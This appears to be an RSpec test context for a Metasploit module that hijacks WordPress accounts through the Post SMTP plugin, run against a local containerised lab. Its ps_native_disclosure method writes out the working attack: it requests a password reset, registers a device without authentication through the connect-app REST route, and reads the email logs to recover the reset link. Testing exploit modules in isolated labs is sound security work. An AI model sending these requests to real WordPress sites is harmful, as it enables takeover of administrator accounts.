# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'nokogiri'
require 'open3'
require 'uri'
require_relative 'profiles'

RSpec.shared_context 'native POST SMTP target' do
  include_context 'module target'

  before(:all) do
    @ps_profile = PostSmtpProfiles.fetch
    @ps_native = { requests: [], commands: [], states: [], module_calls: [] }
    @ps_mail_count = 0
    begin
      ps_counters('before')
      if @ps_profile.fetch('mode') == 'unrelated'
        response = ps_request('/')
        expect(response.code).to eq('200')
        expect(response.body).to include('module-target-http-marker')
      else
        @ps_baseline = ps_state('baseline')
        expect(@ps_baseline.values_at('core', 'php', 'sapi', 'uid', 'prefix')).to eq(['6.8.3', '8.3.28', 'cli', 33, @ps_profile.fetch('prefix')])
        expect(@ps_baseline.fetch('plugin_version')).to eq(@ps_profile.fetch('release'))
        expect(@ps_baseline.fetch('active')).to eq(!@ps_profile.fetch('release').nil?)
        form = ps_request("#{ps_prefix}/wp-login.php?action=lostpassword")
        expect(form.code).to eq('200')
        expect(Nokogiri::HTML(form.body).at_css('form#lostpasswordform input[name="user_login"]')).not_to be_nil
        if @ps_profile.fetch('release')
          release = PostSmtpProfiles::RELEASES.fetch(@ps_profile.fetch('release'))
          expect(@ps_baseline.fetch('archive_sha256')).to eq(release.fetch('sha256'))
          expect(@ps_baseline.fetch('rest_source_sha256')).to eq(release.fetch('rest_source_sha256'))
          expect(@ps_baseline.fetch('active_plugins')).to eq(['post-smtp/postman-smtp.php'])
          expect(@ps_baseline.fetch('options')).to include('hostname' => 'smtp', 'port' => 25, 'auth_type' => 'none')
          expect(@ps_baseline.fetch('logging_enabled')).to eq(@ps_profile.fetch('mode') != 'no_logs')
          expect(@ps_baseline.fetch('auth_nonce')).to be(false)
          expect(ps_request("#{ps_prefix}/wp-content/plugins/post-smtp/readme.txt").body).to include(@ps_profile.fetch('release'))
          ps_native_disclosure
        else
          expect(@ps_baseline.fetch('active_plugins')).to eq([])
          expect(ps_request('/wp-content/plugins/post-smtp/readme.txt').code).to eq('404')
        end
      end
      provenance = console_command('irb -e \'puts "POST_SMTP_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/admin/http/wp_post_smtp_acct_takeover.rb").hexdigest, helper_sha256: Digest::SHA256.file("lib/msf/core/exploit/remote/http/wordpress/users.rb").hexdigest}.to_json\'')
      values = JSON.parse(provenance.match(/^POST_SMTP_PROVENANCE=(.+)$/)[1])
      expect(values.fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(values.fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/auxiliary/admin/http/wp_post_smtp_acct_takeover.rb').hexdigest)
      expect(values.fetch('helper_sha256')).to eq(Digest::SHA256.file('lib/msf/core/exploit/remote/http/wordpress/users.rb').hexdigest)
      @ps_native[:console_provenance] = values
      @ps_native[:preflight] = 'passed'
    ensure
      ps_save
    end
  end

  after(:all) do
    ps_restore if @ps_baseline && @ps_profile.fetch('release')
    expect(ps_state('postflight')).to eq(@ps_baseline) if @ps_baseline && !@ps_profile.fetch('release')
    expect(console_command('irb -e \'puts "POST_SMTP_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('POST_SMTP_STATE={"sessions":[],"jobs":[]}')
  ensure
    ps_counters('after')
    ps_save
  end

  def ps_prefix
    @ps_profile.fetch('prefix')
  end

  def ps_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-post-smtp.json'), JSON.pretty_generate(@ps_native)) if @ps_native
  end

  def ps_command(role, *arguments, input: '', user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '25', *arguments]
    output, error, status = Open3.capture3(*argv, stdin_data: input)
    @ps_native.fetch(:commands) << { argv: argv, stdin_sha256: Digest::SHA256.hexdigest(input), stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    ps_save
    raise "Native POST SMTP command failed: #{role}: #{error}" unless status.success?

    output
  end

  def ps_php(operation, input = {})
    # Execute WordPress as its real HTTP user; the outer timeout bounds wp-load.
    JSON.parse(ps_command('app', 'php', '/opt/module-target/post-smtp-control.php', operation, user: 'www-data', input: JSON.generate(input)))
  end

  def ps_state(label)
    state = ps_php('inspect')
    @ps_native.fetch(:states) << { label: label, value: state }
    ps_save
    state
  end

  def ps_request(path, method: :get, headers: {}, form: nil)
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    request = method == :post ? Net::HTTP::Post.new(path, headers) : Net::HTTP::Get.new(path, headers)
    request.set_form_data(form) if form
    response = http.request(request)
    @ps_native.fetch(:requests) << { method: method, path: path, headers_sent: headers, form: form, code: response.code, headers_received: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s) }
    ps_save
    response
  end

  def ps_mailbox(minimum = @ps_mail_count)
    JSON.parse(ps_command('smtp', 'python3', '/opt/post-smtp-mailbox.py', minimum.to_s))
  end

  def ps_reset_url(message)
    candidates = message.fetch('body').scan(%r{https?://[^\s<>"']+}).select do |url|
      URI.decode_www_form(URI(url).query.to_s).to_h.slice('action', 'login') == { 'action' => 'rp', 'login' => 'module_admin' }
    end
    expect(candidates.length).to eq(1), message.inspect
    candidates.first
  end

  def ps_valid_url(url)
    uri = URI(url)
    endpoint = target_endpoint('app')
    expect([uri.scheme, uri.host, uri.port, uri.path]).to eq(['http', endpoint.fetch('host'), endpoint.fetch('port'), "#{ps_prefix}/wp-login.php"])
    expect(URI.decode_www_form(uri.query).to_h).to include('login' => 'module_admin', 'action' => 'rp')
    expect(ps_php('key', 'url' => url)).to eq('valid' => true, 'login' => 'module_admin')
  end

  def ps_native_disclosure
    begin
      reset = ps_request("#{ps_prefix}/wp-login.php?action=lostpassword", method: :post, form: { 'user_login' => 'module_admin', 'redirect_to' => '', 'wp-submit' => 'Get New Password' })
      expect(reset.code).to eq('302')
      @ps_mail_count += 1
      message = ps_mailbox(@ps_mail_count).last
      expect(message.fetch('to')).to eq('module_target@example.com')
      @ps_native_reset_url = ps_reset_url(message)
      ps_valid_url(@ps_native_reset_url)
      missing_token = ps_request("#{ps_prefix}/wp-json/post-smtp/v1/get-logs")
      expect(missing_token.code).to eq('400')
      expect(JSON.parse(missing_token.body)).to eq('success' => false, 'data' => { 'error' => 'Auth token missing.' })
      headers = { 'fcm-token' => 'module-target-native-token', 'device' => 'Owned native control' }
      registration = ps_request("#{ps_prefix}/wp-json/post-smtp/v1/connect-app", method: :post, headers: headers)
      expect(registration.code).to eq('200')
      if @ps_profile.fetch('mode') == 'fixed'
        expect(JSON.parse(registration.body).fetch('success')).to be(false)
        expect(ps_request("#{ps_prefix}/wp-json/post-smtp/v1/get-logs", headers: headers).code).to eq('401')
      else
        expect(JSON.parse(registration.body).fetch('success')).to be(true)
        response = ps_request("#{ps_prefix}/wp-json/post-smtp/v1/get-logs", headers: headers)
        expect(response.code).to eq('200')
        logs = JSON.parse(response.body).fetch('data')
        if @ps_profile.fetch('mode') == 'no_logs'
          expect(logs).to eq([])
          expect(ps_state('native-logging-disabled').fetch('logs')).to eq([])
        else
          expect(logs.length).to eq(1)
          content = ps_log_content(headers, logs.first.fetch('id'))
          expect(content).to include(@ps_native_reset_url)
        end
      end
    ensure
      ps_restore if @ps_baseline
    end
    expect(ps_php('key', 'url' => @ps_native_reset_url).fetch('valid')).to be(false)
  end

  def ps_log_content(headers, identifier)
    query = URI.encode_www_form('access_token' => headers.fetch('fcm-token'), 'type' => 'log', 'log_id' => identifier)
    response = ps_request("#{ps_prefix}/wp-admin/admin.php?#{query}", headers: headers)
    expect(response.code).to eq('200')
    response.body
  end

  def ps_restore
    expect(ps_php('restore')).to eq('operator_restore' => true, 'mail_audit_logs_retained' => true)
    restored = ps_state('operator-restored')
    expect(restored.except('logs')).to eq(@ps_baseline.except('logs'))
  end

  def ps_owner(options = {}, action: 'run')
    output = run_target_module(PostSmtpProfiles::OWNER, 'app', {
      'SSL' => false, 'TARGETURI' => "#{ps_prefix}/", 'USERNAME' => 'module_admin', 'HttpClientTimeout' => 5
    }.merge(options), action: action, allow_errors: true)
    @ps_native.fetch(:module_calls) << { action: action, options: options, output: output }
    ps_save
    output
  end

  def ps_success(options = {})
    before = ps_state('before-owner')
    mail_count = ps_mailbox.length
    begin
      output = ps_owner(options)
      urls = output.scan(/^\[\+\] Reset URL: (\S+)\s*$/).flatten
      expect(urls.length).to eq(1), output
      ps_valid_url(urls.first)
      messages = ps_mailbox(mail_count + 1)
      expect(messages.length).to eq(mail_count + 1)
      expect(ps_reset_url(messages.last)).to eq(urls.first)
      state = ps_state('after-owner')
      expect(state.fetch('user').fetch('password_sha256')).to eq(before.fetch('user').fetch('password_sha256'))
      expect(state.fetch('user').fetch('activation_key_sha256')).not_to eq(before.fetch('user').fetch('activation_key_sha256'))
      expect(state.fetch('devices').keys.length).to eq(1)
      expect(state.fetch('devices')).not_to eq(before.fetch('devices'))
      expect(state.fetch('logs').length).to eq(before.fetch('logs').length + 1)
      latest = state.fetch('logs').last
      expect(latest).to include('success' => '1', 'original_to' => 'module_target@example.com')
      expect(latest.fetch('original_message')).to include(urls.first)
      device = state.fetch('devices').values.first
      headers = { 'fcm-token' => device.fetch('fcm_token'), 'device' => device.fetch('device') }
      content = ps_log_content(headers, latest.fetch('id'))
      paths = output.scan(/^\[\+\] Full text of log saved to: (.+)$/).flatten
      expect(paths.length).to eq(1), output
      path = File.expand_path(paths.first.strip)
      expect(path).to start_with(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot') + '/')
      expect(File.binread(path)).to eq(content)
    ensure
      ps_restore
    end
    expect(ps_php('key', 'url' => urls.first).fetch('valid')).to be(false) if urls&.first
  end

  def ps_unchanged(options = {}, action: 'run')
    before = ps_state('before-negative') if @ps_baseline
    output = ps_owner(options, action: action)
    expect(output).not_to include('Reset URL:', 'Successfully created token:', 'Full text of log saved to:')
    expect(ps_state('after-negative')).to eq(before) if before
    output
  end

  def ps_counters(phase)
    roles = if @ps_profile.fetch('mode') == 'unrelated'
              ['app']
            elsif @ps_profile.fetch('release')
              %w[app db smtp]
            else
              %w[app db]
            end
    counters = roles.to_h do |role|
      values = %w[memory.events pids.events].to_h do |name|
        pairs = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, pairs]
      end
      [role, values]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "post-smtp-resources-#{phase}.json"), JSON.pretty_generate(counters))
    counters.each_value do |value|
      expect(value.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(value.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
